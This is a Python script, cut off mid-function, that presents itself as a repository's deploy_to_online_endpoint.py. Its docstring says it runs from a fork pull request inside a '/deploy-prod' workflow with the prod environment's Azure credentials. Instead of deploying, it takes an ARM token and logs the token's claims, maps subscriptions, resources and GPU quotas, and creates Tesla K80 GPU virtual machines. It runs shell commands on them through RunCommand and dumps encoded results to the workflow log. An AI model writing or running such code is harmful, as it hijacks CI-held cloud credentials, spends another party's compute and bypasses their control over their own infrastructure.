#!/usr/bin/env python3
"""C211-I125519: plain standardNCFamily (Tesla K80) Azure VM cell on subscription 790067ff.

Runs as src/deploy_to_online_endpoint.py inside the christiansegercrantz/mslearn-mlops
'/deploy-prod' issue_comment workflow (fork PR head, environment prod, azure/login static
creds). All ARM calls below happen under that workflow's ARM identity.

Why this cell: the i125386 AML managed-online-endpoint run measured standardNCFamily 0/80
free and its Standard_NC6 deployment was never quota-refused -- it died on our OWN code-asset
defect (HTTP 400 UserError 'A value for either Model or Code Configuration must be specified').
A direct VM bypasses the code-asset blocker. x120676/x121283 measured the NV and NCSv3 legacy
families but never the plain Standard_NC6/NC12/NC24 (standardNCFamily) SKUs.

Plan (bounded):
  A  ARM token via az CLI; claims + visible subscriptions
  B  RG chriso-sandbox-rg; own-resource inventory
  C  GET Microsoft.Compute/skus (2021-07-01) FULL catalogue: aggregate entries for
     Standard_NC6 / Standard_NC12 / Standard_NC24 (locations + restrictions VERBATIM) and
     record every Standard_(NC|ND|NV)* name present (positive control Standard_NC6s_v3)
  D  GET locations/<region>/usages (2024-07-01) for the candidate regions: verbatim
     standardNCFamily / standardNCPromoFamily / standardNVFamily / cores limits
  E  pre-clean only our own c211-i125519-* resources
  F  qualification: (SKU offered in region, not location-restricted) AND
     standardNCFamily (limit-current) >= vCPUs
  G  marker ladder (one resource alive at a time; every VM nonce-tagged):
       qualified  -> NC6 on-demand in the best qualified region, then on a verbatim
                     on-demand refusal NC12 on-demand in another qualified region, then
                     (after verbatim on-demand refusals) NC6 Spot;
       not offered-> exactly ONE confirmation on-demand NC6 create attempt in the region
                     with the largest free standardNCFamily quota (verbatim refusal)
     Each VM: customData cloud-init installs nvidia-driver-470 and records nvidia-smi -L /
     nvidia-smi --query-gpu=name,uuid,memory.total,driver_version verbatim to
     /var/log/c211-nvidia.log; the probe retrieves that output through the ARM RunCommand
     API and prints it into the workflow log, takes an independent GET/instanceView
     readback, captures every GPU- UUID line, then DELETEs the VM and proves GET 404.
  H  final teardown of every own VM/NIC/vnet + list readback; zlib+b64 result dump.
"""
import base64
import json
import os
import random
import re
import string
import subprocess
import sys
import time
import urllib.error
import urllib.request
import zlib

INTENT = 'i125519'
ARM = 'https://management.azure.com'
SUB = '790067ff-3e39-4632-ad1a-d65702d42c88'
RG_HINT = 'chriso-sandbox-rg'
PREFIX = 'c211-i125519-'
TARGETS = [('Standard_NC6', 6, 1), ('Standard_NC12', 12, 2), ('Standard_NC24', 24, 4)]
CONTROL = 'Standard_NC6s_v3'
REGIONS = ['northeurope', 'westeurope', 'eastus', 'eastus2', 'westus', 'westus2',
           'canadacentral', 'australiaeast', 'southeastasia']
IMAGE = {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy',
         'sku': '22_04-lts', 'version': 'latest'}
DEADLINE = 2700
TEARDOWN_BUDGET = 600
T0 = time.time()
DRY = os.environ.get('C211_DRY') == '1'
DUMMY = '__dry__'

CLOUD_INIT = r'''#cloud-config
write_files:
  - path: /usr/local/bin/c211-nvidia.sh
    permissions: '0755'
    content: |
      #!/bin/bash
      exec > /var/log/c211-nvidia.log 2>&1
      echo "C211_I125519_DEV_BEGIN"
      date -u
      uname -a
      echo "--- pci before ---"
      lspci -nn | grep -Ei 'vga|3d|display|nvidia|10de' || echo NO_GPU_PCI
      echo "--- install driver ---"
      export DEBIAN_FRONTEND=noninteractive
      apt-get update -y || true
      (apt-get install -y nvidia-driver-470 || apt-get install -y nvidia-driver-470-server || apt-get install -y nvidia-driver-390 || true)
      printf 'blacklist nouveau\noptions nouveau modeset=0\n' > /etc/modprobe.d/blacklist-nouveau.conf
      update-initramfs -u || true
      modprobe -r nouveau || true
      modprobe nvidia || true
      modprobe nvidia_uvm || true
      echo "--- wait for device ---"
      for i in $(seq 1 90); do
        if nvidia-smi -L 2>/dev/null | grep -q 'GPU-'; then break; fi
        sleep 10
      done
      echo "--- nvidia-smi -L ---"
      nvidia-smi -L || echo NO_NVIDIA_SMI
      echo "--- nvidia-smi query ---"
      nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader || echo NO_SMI_QUERY
      echo "--- lspci nvidia ---"
      lspci -nn | grep -Ei 'vga|3d|display|nvidia|10de' || echo NO_GPU_PCI2
      echo "--- sysfs 10de ---"
      for d in /sys/bus/pci/devices/*; do
        v=$(cat $d/vendor 2>/dev/null)
        if [ "$v" = "0x10de" ]; then echo "$d vendor=$v device=$(cat $d/device 2>/dev/null)"; fi
      done
      echo "--- dev nodes ---"
      ls -l /dev/nvidia* 2>/dev/null || echo NO_DEV_NODES
      echo "C211_I125519_DEV_END"
      touch /var/log/c211-nvidia.done
runcmd:
  - [ bash, -lc, 'nohup /usr/local/bin/c211-nvidia.sh >/dev/null 2>&1 &' ]
'''

RC_SCRIPT = (
    "echo C211_I125519_RC_BEGIN; "
    "(nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1; "
    "(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader "
    "|| echo NO_SMI_QUERY) 2>&1; "
    "echo ---DONE_MARKER---; (test -f /var/log/c211-nvidia.done && echo DONE || echo RUNNING) 2>&1; "
    "echo ---LOG---; (tail -80 /var/log/c211-nvidia.log 2>/dev/null || echo NO_CLOUDINIT_LOG) 2>&1; "
    "echo ---LSPCI---; (lspci -nn 2>/dev/null | grep -Ei 'vga|3d|display|nvidia|10de' "
    "|| echo NO_GPU_PCI) 2>&1; "
    "echo ---SYSFS---; (for d in /sys/bus/pci/devices/*; do v=$(cat $d/vendor 2>/dev/null); "
    "if [ \"$v\" = \"0x10de\" ]; then echo \"$d vendor=$v device=$(cat $d/device 2>/dev/null)\"; fi; done) 2>&1; "
    "echo ---DEV---; (ls -l /dev/nvidia* 2>/dev/null || echo NO_DEV_NODES) 2>&1; "
    "echo C211_I125519_RC_END"
)


def p(*a):
    print(*a, flush=True)


def emit(R):
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    R['elapsed_s'] = round(time.time() - T0, 1)
    blob = base64.b64encode(zlib.compress(json.dumps(R, default=str).encode(), 9)).decode()
    p('C211_%s_LEN %d' % (INTENT, len(blob)))
    for i in range(0, len(blob), 3000):
        p('C211_%s_B64 %08d %s' % (INTENT, i, blob[i:i + 3000]))


def sh(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'rc': r.returncode, 'out': r.stdout[-8000:], 'err': r.stderr[-3000:]}
    except Exception as e:  # noqa: BLE001
        return {'rc': -1, 'err': repr(e)}


def jget(tok, url, timeout=180):
    if DRY:
        p('[DRY] GET %s' % url)
        return 200, {'value': []}, 0
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok,
                                               'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw or b'{}'), len(raw)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:2500].decode('utf8', 'replace')}, len(raw)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
            try:
                return e.code, json.loads(raw or b'{}'), len(raw)
            except Exception:  # noqa: BLE001
                return e.code, {'raw': raw[:2500].decode('utf8', 'replace')}, len(raw)
        except Exception:  # noqa: BLE001
            return e.code, {}, 0
    except Exception as e:  # noqa: BLE001
        return -1, {'error': repr(e)}, 0


def jcall(tok, method, url, body=None, timeout=300):
    if DRY:
        p('[DRY] %s %s body=%s' % (method, url, json.dumps(body)[:200] if body else None))
        return 200, {'dry': True}, {}
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT,
        'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:2500].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
            try:
                return e.code, json.loads(raw or b'{}'), dict(e.headers)
            except Exception:  # noqa: BLE001
                return e.code, {'raw': raw[:2500].decode('utf8', 'replace')}, dict(e.headers)
        except Exception:  # noqa: BLE001
            return e.code, {}, dict(e.headers)
    except Exception as e:  # noqa: BLE001
        return -1, {'error': repr(e)}, {}


def err_of(r):
    if isinstance(r, dict):
        e = r.get('error')
        if isinstance(e, dict):
            return {'code': e.get('code'), 'message': (e.get('message') or '')[:1500]}
        if e:
            return {'code': None, 'message': str(e)[:1500]}
        if 'raw' in r:
            return {'code': None, 'message': str(r.get('raw'))[:1500]}
        return None
    return {'code': None, 'message': str(r)[:800]}


def gpu_family_map(usages):
    fam = {}
    for u in (usages.get('value') or []):
        nm = ((u.get('name') or {}).get('value') or '')
        low = nm.lower()
        if re.match(r'(?i)^standard(nc|nv|nd)', nm) or low in (
                'cores', 'lowprioritycores', 'virtualmachines'):
            fam[nm] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0),
                       'localized': ((u.get('name') or {}).get('localizedValue'))}
    return fam


def sku_agg(cat_value, name):
    ents = [s for s in (cat_value or []) if s.get('name') == name]
    if not ents:
        return {'present': False, 'name': name,
                'note': 'SKU absent from the subscription Microsoft.Compute/skus catalogue'}
    e0 = ents[0]
    caps = {c.get('name'): c.get('value') for c in (e0.get('capabilities') or [])}
    locs, restr = [], []
    for s in ents:
        for l in (s.get('locations') or []):
            l2 = l.lower().replace(' ', '')
            if l2 not in locs:
                locs.append(l2)
        for r in (s.get('restrictions') or []):
            k = json.dumps(r, sort_keys=True)
            if k not in [json.dumps(x, sort_keys=True) for x in restr]:
                restr.append(r)
    return {'present': True, 'name': name, 'family': e0.get('family'),
            'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs'), 'gpu': caps.get('GPU'),
            'memory_gb': caps.get('MemoryGB'), 'entries': len(ents),
            'locations': locs, 'restrictions': restr,
            'reasons': sorted({(r.get('reasonCode') or '') for r in restr})}


def loc_restricted(ent):
    out = set()
    for rr in (ent.get('restrictions') or []):
        if rr.get('type') == 'Location':
            for l in ((rr.get('restrictionInfo') or {}).get('locations') or []):
                out.add(l.lower().replace(' ', ''))
    return out


def own_resources(tok, sub, rgname):
    st, rs, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/resources?api-version=2021-04-01&$top=500'.format(ARM, sub, rgname))
    if st != 200:
        return {'status': st, 'resp': rs}
    items = [{'name': r.get('name'), 'type': r.get('type'), 'location': r.get('location')}
             for r in (rs.get('value') or [])]
    return {'status': 200, 'count': len(items), 'all_names': [i['name'] for i in items],
            'ours': [i for i in items if str(i['name']).startswith(PREFIX)]}


def delete_until_gone(tok, url, geturl, tries=40, gap=4):
    sd, rb, _ = jcall(tok, 'DELETE', url)
    last = None
    for _ in range(tries):
        time.sleep(gap)
        last, _b, _n = jget(tok, geturl)
        if last == 404:
            break
    return {'delete_http': sd, 'absence_http': last}


def main():
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT,
         'scope': {'subscription': SUB, 'resource_group_hint': RG_HINT,
                   'target_skus': [t[0] for t in TARGETS], 'positive_control': CONTROL,
                   'regions': REGIONS, 'image': IMAGE, 'dry': DRY,
                   'purpose': 'plain standardNCFamily (Tesla K80) VM: NC6/NC12/NC24 were never '
                              'create-tested on 790067ff; the x125386 NC6 AML deployment died on our '
                              'own code-asset defect, not a provider quota refusal'}}

    if DRY:
        # fixed planned method+URL matrix (no network)
        p('C211_%s|DRYPLAN|BEGIN' % INTENT)
        p('[DRY] TOKEN az account get-access-token --resource https://management.azure.com/ -o json')
        planned = [
            'GET {ARM}/subscriptions?api-version=2022-12-01',
            'GET {ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01',
            'GET {ARM}/subscriptions/{sub}/resourceGroups/{rg}/resources?api-version=2021-04-01&$top=500',
            'GET {ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01',
        ]
        for reg in REGIONS:
            planned.append('GET {ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/%s/usages?api-version=2024-07-01' % reg)
        planned += [
            'PUT {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01',
            'PUT {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01',
            'PUT {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01',
            'GET {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView',
            'GET {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01',
            'POST {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01',
            'POST {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/retrieveBootDiagnosticsData?api-version=2024-07-01',
            'GET {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01',
            'DELETE {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01',
            'DELETE {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01',
            'DELETE {ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01',
        ]
        for u in planned:
            p('[DRY] ' + u.format(ARM=ARM, sub=SUB, rg=RG_HINT, vnet=PREFIX + '<nonce>-<region>-vnet',
                                  nic=PREFIX + '<nonce>-<region>-nic', vm=PREFIX + '<nonce>-<sku>'))
        p('C211_%s|DRYPLAN|END' % INTENT)
        emit(R)
        return

    # ---- A. token ----
    tr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tr['out'])
        tok = td.get('accessToken')
        R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:  # noqa: BLE001
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tr['rc']
    if not tok:
        R['fatal'] = 'no ARM token: %s' % (tr.get('err') or tr.get('out'))[:800]
        emit(R)
        return
    cl = R['token_claims']
    p('C211_%s|step=token|appid=%s|oid=%s|tid=%s|exp=%s' % (
        INTENT, cl.get('appid'), cl.get('oid'), cl.get('tid'), R.get('token_expiresOn')))

    st, subs, _ = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'),
                           'name': s.get('displayName')} for s in (subs.get('value') or [])]
    sub = next((s['id'] for s in R['subscriptions'] if s['id'] == SUB), None)
    R['sub'] = sub
    if not sub:
        R['fatal'] = 'target subscription not visible; visible=%s' % R['subscriptions']
        emit(R)
        return

    # ---- B. RG ----
    st, rgs, _ = jget(tok, '{0}/subscriptions/{1}/resourcegroups?api-version=2021-04-01'.format(ARM, sub))
    names = [g.get('name') for g in (rgs.get('value') or [])] if st == 200 else []
    rgname = next((n for n in names if str(n).lower() == RG_HINT), None) or \
        next((n for n in names if str(n).lower().startswith(RG_HINT)), None)
    R['rg_names_count'] = len(names)
    R['rg'] = rgname
    if not rgname:
        R['fatal'] = 'target RG not found among %d' % len(names)
        emit(R)
        return
    stg, rgg, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}?api-version=2021-04-01'.format(ARM, sub, rgname))
    rgloc = (rgg.get('location') or '').lower() if isinstance(rgg, dict) else ''
    R['rg_location'] = rgloc
    R['rg_get_status'] = stg
    R['rg_resources_before'] = own_resources(tok, sub, rgname)
    p('C211_%s|step=rg|name=%s|location=%s|resources=%s|ours=%s' % (
        INTENT, rgname, rgloc, (R['rg_resources_before'] or {}).get('count'),
        json.dumps((R['rg_resources_before'] or {}).get('ours'))[:400]))

    # ---- C. SKU catalogue ----
    sts, cat, catn = jget(tok, '{0}/subscriptions/{1}/providers/Microsoft.Compute/skus?api-version=2021-07-01'.format(ARM, sub), timeout=300)
    catv = (cat.get('value') or []) if sts == 200 else []
    R['sku_catalog'] = {'status': sts, 'bytes': catn, 'entries': len(catv)}
    R['target_skus'] = {s: sku_agg(catv, s) for s, _v, _g in TARGETS}
    R['control_sku'] = sku_agg(catv, CONTROL)
    gpu_names = sorted({s.get('name') for s in catv
                        if re.match(r'(?i)^Standard_(NC|ND|NV)', s.get('name') or '')})
    R['gpu_sku_names_count'] = len(gpu_names)
    R['gpu_sku_names_nc'] = [x for x in gpu_names if x.startswith('Standard_NC')]
    p('C211_%s|step=sku|status=%s|entries=%s|gpu_names=%s|nc_names=%s' % (
        INTENT, sts, len(catv), len(gpu_names), json.dumps(R['gpu_sku_names_nc'])[:1500]))
    for s in [t[0] for t in TARGETS] + [CONTROL]:
        e = R['target_skus'].get(s) or R['control_sku']
        p('C211_%s|step=sku_entry|sku=%s|present=%s|family=%s|vcpus=%s|gpus=%s|nloc=%s|locations=%s|restrictions=%s' % (
            INTENT, s, e.get('present'), e.get('family'), e.get('vcpus'), e.get('gpus'),
            len(e.get('locations') or []), json.dumps((e.get('locations') or [])[:12]),
            json.dumps((e.get('restrictions') or []))[:700]))

    # ---- D. usages ----
    umat = {}
    for reg in REGIONS:
        stu, us, un = jget(tok, '{0}/subscriptions/{1}/providers/Microsoft.Compute/locations/{2}/usages?api-version=2024-07-01'.format(ARM, sub, reg))
        if stu != 200:
            umat[reg] = {'status': stu, 'err': err_of(us)}
            p('C211_%s|step=usage|region=%s|http=%s|err=%s' % (INTENT, reg, stu, json.dumps(err_of(us))[:300]))
            continue
        fam = gpu_family_map(us)
        umat[reg] = {'status': 200, 'bytes': un, 'usage_entries': len(us.get('value') or []),
                     'gpu_families': fam,
                     'nonzero': {k: v for k, v in fam.items() if (v.get('limit') or 0) > 0}}
        ncf = fam.get('standardNCFamily') or {}
        p('C211_%s|step=usage|region=%s|http=200|entries=%s|standardNCFamily=%s/%s|nonzero=%s' % (
            INTENT, reg, len(us.get('value') or []), ncf.get('current'), ncf.get('limit'),
            json.dumps(umat[reg]['nonzero'])[:700]))
        time.sleep(0.15)
    R['usage_matrix'] = umat

    # ---- E. pre-clean own resources ----
    pre = {'steps': []}
    st0, rs0, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/resources?api-version=2021-04-01&$top=500'.format(ARM, sub, rgname))
    items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs0.get('value') or [])] if st0 == 200 else []
    ours = [x for x in items if str(x['name']).startswith(PREFIX)]
    pre['found'] = ours
    p('C211_%s|step=preclean|found=%s' % (INTENT, json.dumps(ours)[:600]))
    for typ in ['Microsoft.Compute/virtualMachines', 'Microsoft.Network/networkInterfaces',
                'Microsoft.Network/virtualNetworks', 'Microsoft.Compute/disks']:
        for x in [y for y in ours if y['type'] == typ]:
            t = typ.split('/')[-1]
            apiv = '2024-07-01' if t == 'virtualMachines' else ('2024-01-01' if t != 'disks' else '2023-04-02')
            url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/{3}/{4}?api-version={5}'.format(
                ARM, sub, rgname, typ, x['name'], apiv)
            d = delete_until_gone(tok, url, url)
            d.update({'name': x['name'], 'type': typ})
            pre['steps'].append(d)
    pre['after'] = own_resources(tok, sub, rgname)
    R['preclean'] = pre

    # ---- F. qualification ----
    def free_nc(reg):
        f = ((umat.get(reg) or {}).get('gpu_families') or {}).get('standardNCFamily') or {}
        try:
            return int(f.get('limit') or 0) - int(f.get('current') or 0)
        except Exception:  # noqa: BLE001
            return 0

    qualified = []
    for sku, vcpu, ngpu in TARGETS:
        ent = R['target_skus'][sku]
        if not ent.get('present'):
            continue
        restr = loc_restricted(ent)
        for reg in REGIONS:
            if reg in (ent.get('locations') or []) and reg not in restr and free_nc(reg) >= vcpu:
                qualified.append({'sku': sku, 'region': reg, 'vcpu': vcpu, 'gpus': ngpu,
                                  'free_nc_vcpus': free_nc(reg)})
    qualified.sort(key=lambda x: (-x['free_nc_vcpus'], TARGETS.index(next(t for t in TARGETS if t[0] == x['sku']))))
    free_regions = sorted([r for r in REGIONS if free_nc(r) > 0], key=lambda r: -free_nc(r))
    R['qualification'] = {'qualified': qualified, 'free_nc_regions': free_regions,
                          'free_nc_matrix': {r: free_nc(r) for r in REGIONS}}
    p('C211_%s|step=qualify|qualified=%s|free_nc_regions=%s|matrix=%s' % (
        INTENT, json.dumps(qualified)[:900], json.dumps(free_regions),
        json.dumps(R['qualification']['free_nc_matrix'])))

    # ---- G. marker ladder ----
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    R['nonce'] = nonce
    nets = {}
    R['nets'] = nets

    def ensure_net(region):
        if region in nets:
            return nets[region].get('nic_id')
        tag = PREFIX + nonce + '-' + region
        vnet = tag + '-vnet'
        sn = tag + '-subnet'
        nic = tag + '-nic'
        rec = {'region': region, 'vnet': vnet, 'subnet': sn, 'nic': nic, 'nic_id': None}
        nets[region] = rec
        vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'addressSpace': {'addressPrefixes': ['10.213.0.0/16']},
                             'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.213.1.0/24'}}]}}
        s1, r1, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, vnet), vb)
        rec['vnet_create'] = {'status': s1, 'err': err_of(r1) if s1 not in (200, 201) else None}
        p('C211_%s|step=net|region=%s|vnet=%s|http=%s' % (INTENT, region, vnet, s1))
        if s1 not in (200, 201):
            return None
        for _ in range(30):
            stv, vs, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, vnet))
            props = (vs.get('properties') or {}) if stv == 200 else {}
            subs_states = [((x.get('properties') or {}).get('provisioningState')) for x in (props.get('subnets') or [])]
            rec['vnet_settle'] = {'status': stv, 'state': props.get('provisioningState'), 'subnets': subs_states}
            if stv == 200 and props.get('provisioningState') == 'Succeeded' and all(x == 'Succeeded' for x in subs_states):
                break
            time.sleep(4)
        subnet_id = '/subscriptions/{0}/resourceGroups/{1}/providers/Microsoft.Network/virtualNetworks/{2}/subnets/{3}'.format(sub, rgname, vnet, sn)
        nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {
                  'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
        s2 = r2 = None
        tries = []
        for _ in range(12):
            s2, r2, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/networkInterfaces/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, nic), nb)
            tries.append({'status': s2, 'code': (err_of(r2) or {}).get('code') if s2 not in (200, 201) else None})
            if s2 in (200, 201):
                rec['nic_id'] = (r2 or {}).get('id')
                break
            time.sleep(8)
        rec['nic_create'] = {'status': s2, 'tries': tries, 'err': err_of(r2) if s2 not in (200, 201) else None}
        p('C211_%s|step=net|region=%s|nic=%s|http=%s|err=%s' % (
            INTENT, region, nic, s2, json.dumps(rec['nic_create'].get('err'))[:400]))
        return rec.get('nic_id')

    def vm_put(ent, sku, region, nic_id, spot):
        vm = PREFIX + nonce + '-' + sku.replace('_', '').lower() + ('-spot' if spot else '')
        props = {
            'hardwareProfile': {'vmSize': sku},
            'storageProfile': {'imageReference': IMAGE,
                               'osDisk': {'createOption': 'FromImage',
                                          'managedDisk': {'storageAccountType': 'Standard_LRS'},
                                          'deleteOption': 'Delete'}},
            'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe',
                          'adminPassword': (''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'),
                          'customData': base64.b64encode(CLOUD_INIT.encode()).decode(),
                          'linuxConfiguration': {'disablePasswordAuthentication': False}},
            'networkProfile': {'networkInterfaces': [{'id': nic_id,
                                                      'properties': {'deleteOption': 'Delete'}}]},
            'diagnosticsProfile': {'bootDiagnostics': {'enabled': True}},
        }
        if spot:
            props['priority'] = 'Spot'
            props['evictionPolicy'] = 'Delete'
            props['billingProfile'] = {'maxPrice': -1}
        body = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce, 'sku': sku,
                                             'mode': 'spot' if spot else 'ondemand'},
                'properties': props}
        url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
        s3 = r3 = None
        tries = []
        for _ in range(5):
            s3, r3, _ = jcall(tok, 'PUT', url, body, timeout=420)
            tries.append({'status': s3, 'code': (err_of(r3) or {}).get('code') if s3 not in (200, 201) else None})
            if s3 in (200, 201) or s3 != 429:
                break
            time.sleep(12)
        return vm, url, {'status': s3, 'tries': tries,
                         'err': err_of(r3) if s3 not in (200, 201) else None}

    def run_command(vm):
        script = RC_SCRIPT
        url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/runCommand?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
        src, rr_, rh = jcall(tok, 'POST', url,
                             {'commandId': 'RunShellScript', 'script': [script]}, timeout=180)
        pollurl = None
        for k in ('Azure-AsyncOperation', 'azure-asyncoperation', 'Location', 'location'):
            if rh.get(k):
                pollurl = rh.get(k)
                break
        rec = {'submit_http': src, 'poll_url': pollurl, 'polls': []}
        captured = None
        if src in (200, 201, 202) and pollurl:
            pu = pollurl if str(pollurl).startswith('http') else ARM + str(pollurl)
            for _ in range(45):
                time.sleep(8)
                st5, r5, _ = jget(tok, pu)
                sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                rec['polls'].append({'http': st5, 'state': sval})
                if sval in ('Succeeded', 'Failed', 'Canceled'):
                    captured = r5
                    break
        msgs = []
        try:
            outp = ((captured or {}).get('properties') or {}).get('output')
            if isinstance(outp, str) and outp.strip().startswith('{'):
                oj = json.loads(outp)
                for v in oj.get('value') or []:
                    msgs.append(str(v.get('message'))[:40000])
        except Exception:  # noqa: BLE001
            pass
        if not msgs:
            msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,40000})"', json.dumps(captured or {}))[:6]
        rec['output_excerpt'] = '\n'.join(msgs)[:30000]
        return rec

    attempts = []
    R['attempts'] = attempts
    device = {'proven': False, 'gpu_uuids': [], 'nvidia_smi_list': None,
              'nvidia_smi_query': None, 'lspci': None, 'sysfs_10de': None}
    R['device'] = device
    vm_names = []

    def do_attempt(sku, region, spot, why):
        att = {'sku': sku, 'region': region, 'priority': 'Spot' if spot else 'Regular',
               'why': why, 'spot': spot}
        attempts.append(att)
        ent = R['target_skus'].get(sku) or {}
        att['sku_present_in_catalog'] = ent.get('present')
        att['sku_family'] = ent.get('family')
        nic_id = ensure_net(region)
        if not nic_id:
            att['skipped'] = 'no NIC in region'
            return 'net-fail'
        vm, vmurl, put = vm_put(ent, sku, region, nic_id, spot)
        att['vm'] = vm
        att['vm_put'] = put
        p('C211_%s|step=vm_put|sku=%s|region=%s|spot=%s|http=%s|err=%s' % (
            INTENT, sku, region, spot, put['status'], json.dumps(put.get('err'))[:700]))
        if put['status'] not in (200, 201):
            return 'refused'
        vm_names.append(vm)
        prov = None
        for _ in range(30):
            time.sleep(10)
            stg, g, _ = jget(tok, vmurl + '&$expand=instanceView')
            prov = ((g.get('properties') or {}).get('provisioningState')) if stg == 200 else None
            if prov in ('Succeeded', 'Failed'):
                break
        att['provisioning_state'] = prov
        stiv, iv, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/instanceView?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
        att['instance_view'] = {'status': stiv,
                                'statuses': [{'code': x.get('code'), 'level': x.get('level'),
                                              'message': (x.get('message') or '')[:1500]}
                                             for x in ((iv.get('statuses') or []) if stiv == 200 else [])]}
        p('C211_%s|step=prov|sku=%s|region=%s|state=%s|statuses=%s' % (
            INTENT, sku, region, prov, json.dumps(att['instance_view']['statuses'])[:1200]))
        if prov != 'Succeeded':
            return 'failed'
        # device capture loop: wait for cloud-init driver install, poll RunCommand
        rc_all = []
        uuids = []
        for i in range(18):
            rc = run_command(vm)
            rc_all.append({'i': i, 'submit_http': rc.get('submit_http'),
                           'polls_tail': rc.get('polls', [])[-2:],
                           'excerpt_len': len(rc.get('output_excerpt') or '')})
            txt = rc.get('output_excerpt') or ''
            if txt:
                p('C211_%s|step=rc_output|sku=%s|region=%s|i=%s|%s' % (
                    INTENT, sku, region, i, txt.replace('\n', ' | ')[:2500]))
            uu = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{16,}', txt)))
            if uu:
                uuids = uu
                device['gpu_uuids'] = uu
                m1 = re.search(r'C211_I125519_(?:RC_BEGIN|DEV_BEGIN)(.*?)(?:---|C211_I125519_(?:RC_END|DEV_END))', txt, re.S)
                if m1:
                    device['nvidia_smi_list'] = m1.group(1).strip()[:2000]
                q = re.search(r'([^\n]*,GPU-[0-9a-fA-F-]{16,}[^\n]*)', txt)
